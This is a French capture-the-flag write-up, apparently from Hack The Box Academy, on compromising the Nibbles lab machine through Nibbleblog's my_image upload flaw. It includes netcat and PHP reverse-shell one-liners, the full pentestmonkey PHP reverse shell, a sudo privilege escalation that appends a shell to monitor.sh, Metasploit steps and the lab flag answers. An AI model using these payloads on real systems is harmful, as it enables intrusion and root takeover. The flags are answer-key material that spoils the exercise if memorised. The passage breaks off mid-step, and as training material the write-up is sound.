Warning: imagecopyresampled() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 118

Warning: imagejpeg() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 43

Warning: imagedestroy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 80
```

Il nous faut maintenant déterminer où le fichier a été téléchargé si le transfert a réussi. En reprenant les résultats de l'exploration par force brute, nous nous souvenons du répertoire `/content`. Celui-ci contient un répertoire `plugins` et un sous-répertoire nommé `my_image`. Le chemin complet est : `http://<host>/nibbleblog/content/private/plugins/my_image/`. Dans ce répertoire, nous trouvons **deux fichiers**, `db.xml` et `image.php`, dont la date de dernière modification est récente, ce qui signifie que le téléchargement a réussi ! Vérifions maintenant si nous avons accès à l'exécution des commandes.

```bash
Arcony@htb[/htb]$ curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php

uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

C'est fait ! Il semble que nous ayons **obtenu l'exécution de code à distance sur le serveur web**, et le serveur Apache s'exécute dans le contexte utilisateur nibbler. Modifions notre fichier PHP pour obtenir un **reverse shell** et commençons à explorer le serveur.

Modifions notre fichier PHP local et téléchargeons-le à nouveau. Cette commande devrait nous donner un reverse shell. Comme mentionné précédemment dans ce module, il existe de nombreux guides pratiques pour obtenir un reverse shell. Parmi les meilleurs, citons [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) et [HighOn,Coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/).

Utilisons la commande Bash suivante pour obtenir un reverse shell et ajoutons-la à notre `script PHP`.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT) >/tmp/f
```

Nous ajouterons l'adresse IP de notre `VPN tun0` dans l'espace réservé <ATTACKING IP> et un port de notre choix pour <LISTENING PORT> afin de capturer le reverse shell sur notre **écouteur netcat**. Voir le script PHP modifié ci-dessous.

```bash
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>
```

Nous téléchargeons à nouveau le fichier et démarrons un écouteur netcat dans notre terminal :

```bash
0xdf@htb[/htb]$ nc -lvnp 9443

listening on [any] 9443 ...
```

Exécutez à nouveau la commande `cURL` sur la page de l'image ou accédez-y via Firefox à l'adresse http://nibbleblog/content/private/plugins/my_image/image.php pour exécuter le reverse shell.

```bash
Arcony@htb[/htb]]$ nc -lvnp 9443

listening on [any] 9443 ...
connect to [10.10.14.2] from (UNKNOWN) [10.129.42.190] 40106
/bin/sh: 0: can't access tty; job control turned off
$ id

uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

De plus, nous disposons d'un reverse shell. Avant de poursuivre l'énumération, `mettons à niveau notre shell` vers un shell **plus convivial**, car celui que nous avons obtenu n'est pas un TTY pleinement interactif : certaines commandes comme `su` ne fonctionnent pas, nous ne pouvons pas utiliser d'éditeurs de texte, la complétion automatique est inopérante, etc. [Cet article](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) explique plus en détail le problème et propose différentes méthodes pour passer à un **TTY pleinement interactif**. Pour nos besoins, nous utiliserons une commande Python en une seule ligne pour créer un pseudo-terminal afin que les commandes telles que `su` et `sudo` fonctionnent, comme expliqué précédemment dans ce module.

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Essayez les différentes techniques de mise à niveau vers un terminal TTY complet et choisissez celle qui vous convient le mieux. Notre première tentative a échoué **car Python 2 semble absent du système** !

```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'

/bin/sh: 3: python: not found

$ which python3

/usr/bin/python3
```

Nous disposons cependant de `Python 3`, qui nous permet d'accéder à un shell plus convivial en tapant `python3 -c 'import pty; pty.spawn("/bin/bash")'`. En naviguant dans `/home/nibbler`, nous trouvons le fichier `user.txt` ainsi qu'une archive ZIP nommée `personal.zip`.

```bash
nibbler@Nibbles:/home/nibbler$ ls

ls
personal.zip  user.txt
```

---

**Gain a foothold on the target and submit the user.txt flag**

Maintenant nous devons gagner un accès a la machine `10.129.71.93` en applicant ce que nous avons appris.

En premier nous commençons consulter le site sur le web et enfaite c'est la même machine que celle présenté précédemment donc quand on arrive sur le site il y a le même `hello world!` et le même commentaire `<!-- /nibbleblog/ directory. Nothing interesting here! -->`

Dons pour vérifier si c'est la même machine nous allons testé les identifiants dans la page `/admin.php`

La page admin.php n'existe pas dans la page de base donc je procède donc a un scan avec `nmap`

```bash
┌─[eu-academy-3]─[10.10.15.31]─[htb-ac-1999270@htb-sjsot6xxnm]─[~]
└──╼ [★]$ nmap -sC -sV 10.129.71.93
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-11 08:51 CST
Nmap scan report for 10.129.71.93
Host is up (0.053s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.32 seconds
```

Nous pouvons y voir que le port 22 pour SSH et 80 pour HTTP sont ouvert, juste au cas où je fais un scan plus approfondi avec le `-p-` pour scanner l'intégralité des ports mais ça ne donne pas plus d'informations.

```bash
┌─[eu-academy-3]─[10.10.15.31]─[htb-ac-1999270@htb-sjsot6xxnm]─[~]
└──╼ [★]$ nmap -sC -p- 10.129.71.93
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-11 08:56 CST
Nmap scan report for 10.129.71.93
Host is up (0.049s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http
|_http-title: Site doesn't have a title (text/html).

Nmap done: 1 IP address (1 host up) scanned in 24.51 seconds
```

Maintenant nous allons nous pencher sur un gobuster pour énumérer les possibles pages / dossiers sur lesquels on pourrait aller:

```bash
┌─[eu-academy-3]─[10.10.15.31]─[htb-ac-1999270@htb-sjsot6xxnm]─[~]
└──╼ [★]$ gobuster dir -u http://10.129.71.93 -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.71.93
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 291]
/.htaccess            (Status: 403) [Size: 296]
/.htpasswd            (Status: 403) [Size: 296]
/index.html           (Status: 200) [Size: 93]
/server-status        (Status: 403) [Size: 300]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

Mais là non plus rien de spécial donc maintenant nous allons voir ce que le fameux commentaire nous montre, mais si on se rend directement sur http://10.129.71.93/nibbleblog/ ça nous montre la même capture d'écran que précédemment donc on va refaire un `gobuster` pour y voir plus clair

```bash
┌─[eu-academy-3]─[10.10.15.31]─[htb-ac-1999270@htb-kymoxowfme]─[~]
└──╼ [★]$ gobuster dir -u http://10.129.71.93/nibbleblog -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.71.93/nibbleblog
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 302]
/.htaccess            (Status: 403) [Size: 307]
/.htpasswd            (Status: 403) [Size: 307]
/admin                (Status: 301) [Size: 323] [--> http://10.129.71.93/nibbleblog/admin/]
/admin.php            (Status: 200) [Size: 1401]
/content              (Status: 301) [Size: 325] [--> http://10.129.71.93/nibbleblog/content/]
/index.php            (Status: 200) [Size: 2987]
/languages            (Status: 301) [Size: 327] [--> http://10.129.71.93/nibbleblog/languages/]
/plugins              (Status: 301) [Size: 325] [--> http://10.129.71.93/nibbleblog/plugins/]
/README               (Status: 200) [Size: 4628]
/themes               (Status: 301) [Size: 324] [--> http://10.129.71.93/nibbleblog/themes/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

Bingo voici notre `admin.php` pour se connecter et on peut y voir les différentes pages disponible maintenant il nous faut un nom d'utilisateur. Nous pouvons dire que c'est finalement la même machine que dans les exemple plus haut

Nous cherchons donc un nom d'utilisateur ainsi que un mot de passe car si c'est la même box que la machine `Nibbles` sur HTB labs en easy ça veut dire que il y a un empèchement d'attaque par force brute dans le site mais **rien ne nous empèche de le faire localement avec `Hashcat`**.

Dans le `README` nous pouvons y lire tout ça mais ce qui nous intéresse sont les première lignes:

```bash
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01

Site: http://www.nibbleblog.com
Blog: http://blog.nibbleblog.com
Help & Support: http://forum.nibbleblog.com
Documentation: http://docs.nibbleblog.com

===== Social =====
* Twitter: http://twitter.com/nibbleblog
* Facebook: http://www.facebook.com/nibbleblog
* Google+: http://google.com/+nibbleblog

===== System Requirements =====
* PHP v5.2 or higher
* PHP module - DOM
* PHP module - SimpleXML
* PHP module - GD
* Directory â€œcontentâ€ writable by Apache/PHP

Optionals requirements

* PHP module - Mcrypt

===== Installation guide =====
1- Download the last version from http://nibbleblog.com
2- Unzip the downloaded file
3- Upload all files to your hosting or local server via FTP, Shell, Cpanel, others.
4- With your browser, go to the URL of your web. Example: www.domain-name.com
5- Complete the form
6- Done! you have installed Nibbleblog

===== About the author =====
Name: Diego Najar
E-mail: dignajar@gmail.com
Linkedin: http://www.linkedin.com/in/dignajar

===== Example Post =====
<h1>Lorem ipsum dolor sit amet</h1>
<p>ea tibique disputando qui. Utroque laboramus percipitur sea id, no oporteat constituto mea? Dico iracundia mnesarchum cum an, cu vidit albucius prodesset his. Facer primis essent ut quo, ea vivendo legendos assueverit vel, ne sed nonumes percipitur? No usu agam volutpat!</p>
<h2>An mutat docendi quo</h2>
<p>nusquam apeirian constituam ius cu? Et mel eripuit noluisse scriptorem, habeo dissentiet te qui, at veniam impedit deterruisset eam. Ne mollis aliquam sea, te vis tation inimicus ullamcorper, cum illum invenire id? Nam causae euripidis necessitatibus ex. Case ferri graece at vix. Usu platonem mediocritatem id, ullum salutatus at sed.</p>
<ol>
<li><strong>Graecis explicari vim cu</strong>. Vim simul tibique in, bonorum officiis maluisset eam an? Ut senserit argumentum pri, mei ut unum tollit labores. Mea tation nusquam detracto et. Ius quis disputationi an!</li>
<li><strong>Cu ignota inermis pri</strong>. Percipit sadipscing eu has. Ipsum laoreet suscipiantur nam in, ius probo rebum explicari cu. Doming aliquam tractatos usu in, sea tation feugiat adversarium te, at modus virtute antiopam per. Sit at ipsum atqui viderer, te vim dolores volutpat constituam.</li>
</ol>
<p>Eum malorum appellantur in, qui ad contentiones consequuntur interpretaris. Cu aeque gloriatur scriptorem vim! Fugit admodum sed ne? Natum scripta intellegebat sit ut, aeque forensibus ei eam. Mazim delicata ius id, usu at idque delicata perpetua. Mollis vidisse reprimique te has, oblique graecis voluptaria vis in. Sed ea aliquam indoctum, duo at hinc mucius, ex iudicabit consulatu mel.</p>
<p>Eu nisl debet convenire nam, et epicurei periculis democritum est, nam eu stet elitr oratio. Eam iriure virtute equidem in, ei summo officiis dignissim nec! Et nam soleat fuisset, doming fastidii voluptatum ea ius, errem volutpat cum eu! Ex detracto assueverit cum. An eos graeco utamur, veri audire his no. Possit dissentias ei mei, quidam efficiantur delicatissimi est id, vel iuvaret adipisci mnesarchum id.</p>
<pre>git clone [git-repo-url] nibbleblog<br />cd nibbleblog<br />npm i -d<br />mkdir -p public/files/{md,html,pdf}</pre>
<p>An mutat docendi quo, nusquam apeirian constituam ius cu? Et mel eripuit noluisse scriptorem, habeo dissentiet te qui, at veniam impedit deterruisset eam. Ne mollis aliquam sea, te vis tation inimicus ullamcorper, cum illum invenire id? Nam causae euripidis necessitatibus ex. Case ferri graece at vix. Usu platonem mediocritatem id, ullum salutatus at sed.</p>
<p>Graecis explicari vim cu. Vim simul tibique in, bonorum officiis maluisset eam an? Ut senserit argumentum pri, mei ut unum tollit labores. Mea tation nusquam detracto et. Ius quis disputationi an!</p>
<pre><code data-language="php">&lt;?php
	echo "Hello Nibbleblog";
	$tmp = array(1,2,3);
	foreach($tmp as $number)
		echo $number;
?&gt;</code></pre>
<h2>How to install Git</h2>
<p>An mutat docendi quo, nusquam apeirian constituam ius cu? Et mel eripuit noluisse scriptorem, habeo dissentiet te qui, at veniam impedit deterruisset eam. Ne mollis aliquam sea, te vis tation inimicus ullamcorper, cum illum invenire id? Nam causae euripidis necessitatibus ex. Case ferri graece at vix. Usu platonem mediocritatem id, ullum salutatus at sed.</p>
<pre class="nb-console">sudo yum install git</pre>
<p>An mutat docendi quo, nusquam apeirian constituam ius cu? Et mel eripuit noluisse scriptorem, habeo dissentiet te qui, at veniam impedit deterruisset eam. Ne mollis aliquam sea, te vis tation inimicus ullamcorper.</p>
```

Nous y voyons que la version utilisé est `4.0.3` de Nibbleblog 

Dans le `/content/private/user.XML` nous pouvons y lire ceci:

```bash
<users>
<user username="admin">
<id type="integer">0</id>
<session_fail_count type="integer">0</session_fail_count>
<session_date type="integer">1514544131</session_date>
</user>
<blacklist type="string" ip="10.10.10.1">
<date type="integer">1512964659</date>
<fail_count type="integer">1</fail_count>
</blacklist>
</users>
```

Donc notre utilisateur commence bien par `admin` en nom d'utilisateur maintenant il faut encore trouver le mot de passe. Et nous savons que une fois connecté en tant qu'admin ou utilisateur nous pourrons exploiter [cette faille](https://www.rapid7.com/db/modules/exploit/multi/http/nibbleblog_file_upload/)

Donc comme il est dit dans l'installation par défaut de Nibbles c'est que le mot de passe par défaut est `nibbles` donc j'ai testé et ça a marché direcement !

Maintenant que nous sommes dans le dashboard admin, maintenant nous pouvons exploiter l'exploit du plugin `my_image` qui se trouve dans l'onglet `plugins` et ensuite il faut cliquer sur `configure` sur le plugin en question de my_image et nous pouvons voir qu'on peut mettre une image ce qui sera notre **point d'entrée** en y mettant un script php pour faire un reverse shell

Donc nous créeons un fichier contentant ceci:

```bash
php -r '$sock=fsockopen("10.10.15.31",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Bien sûr avant j'ai mis sur écoute le port `8080 avec netcat` et maintenant nous voyons ces erreurs dans le site ce qui est normal:

```bash

Warning: imagesx() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 26

Warning: imagesy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 27

Warning: imagecreatetruecolor(): Invalid image dimensions in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 117

Warning: imagecopyresampled() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 118

Warning: imagejpeg() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 43

Warning: imagedestroy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 80
```

Mais quand je me rend sur cet URL là où l'image est stocké pour lancer mon script ça ne fonctionne pas, il ne se lance pas : `http://10.129.129.76/nibbleblog/content/private/plugins/my_image/image.php`

Donc je met un autre script php pour que cette fois ci ça le lance

Voici ce que je trouve comme script php en reverse shell : [php-reverse-shell](https://github.com/d4t4s3c/OffensiveReverseShellCheatSheet/blob/master/php-reverse-shell.php)

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.15.31';  // CHANGE THIS
$port = 8080;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

Et de retour sur la page pour faire charger l'image du plugin ça lance le script php et mon reverse shell s'exécute et je rentre dans la machine:

```bash
┌─[eu-academy-3]─[10.10.15.31]─[htb-ac-1999270@htb-tbus1nlgkp]─[~]
└──╼ [★]$ nc -lvnp 8080
listening on [any] 8080 ...
connect to [10.10.15.31] from (UNKNOWN) [10.129.129.76] 39184
Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 11:06:35 up 36 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
/bin/sh: 0: can't access tty; job control turned off
$
```

Je vais dans un premier dans dans le `/home/nibbles` et je `cat user.txt`

**Réponse :** `79c03865431abf47b90ef24b9695e148`

## Nibbles - Privilege Escalation

Maintenant que nous avons une connexion reverse shell, il est temps **d'élever nos privilèges**. Nous pouvons **décompresser** le fichier `personal.zip` et y trouver un fichier nommé `monitor.sh`.

```bash
nibbler@Nibbles:/home/nibbler$ unzip personal.zip

unzip personal.zip
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh
```

Le script shell `monitor.sh` est un **script de surveillance**, et il appartient à notre utilisateur nibbler et est **accessible en écriture**.

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ cat monitor.sh

cat monitor.sh
                 ####################################################################################################

                 #                                        Tecmint_monitor.sh                                        #

                 # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #

                 # If any bug, report us in the link below                                                          #

                 # Free to use/edit/distribute the code below by                                                    #

                 # giving proper credit to Tecmint.com and Author                                                   #

                 #                                                                                                  #

                 ####################################################################################################

#! /bin/bash

# unset any variable which system may be using

# clear the screen

clear

unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage

while getopts iv name
do
       case $name in
         i)iopt=1;;
         v)vopt=1;;
         *)echo "Invalid arg";;
       esac
done

 <SNIP>
```

Laissons cela de côté pour l'instant et utilisons [LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh) pour effectuer des **vérifications automatisées d'élévation de privilèges**. Commencez par **télécharger le script sur votre machine** virtuelle d'attaque locale ou sur Pwnbox, puis démarrez un `serveur HTTP` Python à l'aide de la commande : `sudo python3 -m http.server 8080`.

```bash
Arcony@htb[/htb]$ sudo python3 -m http.server 8080
[sudo] password for ben: ***********

Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.129.42.190 - - [17/Dec/2020 02:16:51] "GET /LinEnum.sh HTTP/1.1" 200 -
```

De retour sur la cible, saisissez `wget http://<votre adresse IP>:8080/LinEnum.sh` pour télécharger le script. En cas de succès, vous recevrez une réponse 200 sur votre serveur HTTP Python. Une fois le script téléchargé, saisissez `chmod +x LinEnum.sh` pour le rendre exécutable, puis `./LinEnum.sh` pour l'exécuter. Vous verrez alors de nombreuses informations intéressantes, mais ce qui attire immédiatement l'attention, **ce sont les privilèges sudo**.

```bash
[+] We can sudo without supplying a password!
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh


[+] Possible sudo pwnage!
/home/nibbler/personal/stuff/monitor.sh
```

L'utilisateur `nibbler` peut exécuter le fichier `/home/nibbler/personal/stuff/monitor.sh` avec les **privilèges root**. Puisque nous avons un contrôle total sur ce fichier, si nous y **ajoutons une commande de reverse shell** et l'exécutons avec sudo, nous devrions obtenir un shell inversé en tant qu'utilisateur root. Modifions donc le fichier `monitor.sh` pour y ajouter cette commande.

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 8443 >/tmp/f' | tee -a monitor.sh
```

Si nous affichons le contenu du fichier monitor.sh, nous verrons qu'il est ajouté à la fin. `Ceci est crucial si jamais nous rencontrons une situation où nous pourrions exploiter un fichier accessible en écriture pour une élévation de privilèges`. Nous n'ajoutons le contenu **qu'à la fin du fichier** (après en avoir effectué une copie de sauvegarde) afin d'**éviter de l'écraser et de provoquer une interruption de service**. Exécutez le script avec sudo :

```bash
 nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
```

Enfin, interceptez le shell racine sur notre écouteur nc en attente.

```bash
Arcony@htb[/htb]]$ nc -lvnp 8443

listening on [any] 8443 ...
connect to [10.10.14.2] from (UNKNOWN) [10.129.42.190] 47488
# id

uid=0(root) gid=0(root) groups=0(root)
```

À partir d'ici, nous pouvons récupérer le flag `root.txt`. Nous avons ainsi résolu **notre première boîte sur HTB**. Essayez de reproduire toutes les étapes vous-même. Testez différents outils pour obtenir le même résultat. De nombreux outils peuvent être utilisés pour les différentes étapes nécessaires à la résolution de cette boîte. Ce tutoriel présente une méthode possible. Prenez des notes détaillées pour vous entraîner à maîtriser cette compétence essentielle.

---

**Escalate privileges and submit the root.txt flag.**

Alors j'ai appliquer ce que nous venons de voir et voici le résultat

**Réponse :** `de5e5d6619862a8aa5b9b212314e0cdd`

## Nibbles - Alternate User Method - Metasploit

Comme mentionné précédemment, un module `Metasploit` fonctionne également avec cette machine. Son utilisation est **beaucoup plus simple**, mais il est conseillé de s'entraîner aux `deux méthodes` afin de maîtriser un maximum d'outils et de techniques. Lancez Metasploit depuis votre machine d'attaque en saisissant `msfconsole`. Une fois Metasploit chargé, vous pouvez rechercher l'exploit.

```bash
msf6 > search nibbleblog

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description

-  ----                                       ---------------  ----       -----  -----------

   0  exploit/multi/http/nibbleblog_file_upload  2015-09-01       excellent  Yes    Nibbleblog File Upload Vulnerability


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/nibbleblog_file_upload
```

Vous pouvez ensuite saisir « `use 0` » pour charger l'exploit sélectionné. Définissez l'option « `rhosts` » comme l'adresse IP cible et « `lhosts` » comme l'adresse IP de votre adaptateur **tun0** (celui fourni avec la connexion VPN à HackTheBox).

```bash
msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp

msf6 exploit(multi/http/nibbleblog_file_upload) > set rhosts 10.129.42.190
rhosts => 10.129.42.190
msf6 exploit(multi/http/nibbleblog_file_upload) > set lhost 10.10.14.2 
lhost => 10.10.14.2
```

Tapez « `show options` » pour voir quelles autres options doivent être configurées.

```bash
msf6 exploit(multi/http/nibbleblog_file_upload) > show options 

Module options (exploit/multi/http/nibbleblog_file_upload):

  Name       Current Setting  Required  Description
----       ---------------  --------  -----------
  PASSWORD                    yes       The password to authenticate with
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS     10.129.42.190    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
  RPORT      80               yes       The target port (TCP)
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  TARGETURI  /                yes       The base path to the web application
  USERNAME                    yes       The username to authenticate with
  VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

  Name   Current Setting  Required  Description
----   ---------------  --------  -----------
  LHOST  10.10.14.2       yes       The listen address (an interface may be specified)
  LPORT  4444             yes       The listen port


Exploit target:

  Id  Name
--  ----
  0   Nibbleblog 4.0.3
```

Nous devons définir le nom d'utilisateur et le mot de passe de l'administrateur sur `admin:nibbles` et la cible sur nibbleblog.

```bash
msf6 exploit(multi/http/nibbleblog_file_upload) > set username admin
username => admin
msf6 exploit(multi/http/nibbleblog_file_upload) > set password nibbles
password => nibbles
msf6 exploit(multi/http/nibbleblog_file_upload) > set targeturi nibbleblog
targeturi => nibbleblog
```

Il nous faut également modifier le type de **payload**. Prenons par exemple `generic/shell_reverse_tcp`. Une fois ces options saisies, il suffit de taper `exploit` pour obtenir un reverse shell.

```bash
